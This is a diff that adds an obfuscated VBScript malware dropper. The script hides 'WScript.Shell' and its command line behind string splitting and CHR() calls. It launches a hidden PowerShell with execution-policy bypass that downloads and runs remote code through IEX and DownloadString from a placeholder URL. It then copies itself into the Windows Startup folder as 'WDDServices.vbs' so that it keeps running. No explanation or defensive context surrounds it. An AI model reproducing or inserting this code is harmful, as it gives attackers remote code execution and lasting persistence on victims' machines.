@@ -1,0 +1,15 @@
+ThpTJUQEwQwiDTrEwhrwihLsk= "W"&"s"&"c"&"r"&"i"&CHR(80)&"t."&"s"&"h"&"E"&"l"&"l"
+Set objShell = CreateObject(ThpTJUQEwQwiDTrEwhrwihLsk)
+iUhZvprsvTJQABwwCTnwpCGEU = "CMD.EXE /C PO"_
+&"W"_
+&CHR(69)_
+&"RSH"_
+&"ELL.EXE -ex"_
+&"ec Bypass -C  IEX(N"_
+&"ew-Object Net.Webclient).D"_
+&"ownloadString('%P%')"
+objShell.Run(iUhZvprsvTJQABwwCTnwpCGEU),0
+set fhEypCBihEJsEyhEvnxnJpphk = wscript.createobject("wscript.shell")
+set MwvCwnvQkkCBJCrJMJkxTsnkn = createobject("scripting.filesystemobject")
+startup = fhEypCBihEJsEyhEvnxnJpphk.specialfolders ("startup") & "\ W" & "DD" & "Services.vbs"
+MwvCwnvQkkCBJCrJMJkxTsnkn.copyfile wscript.scriptfullname,startup ,true
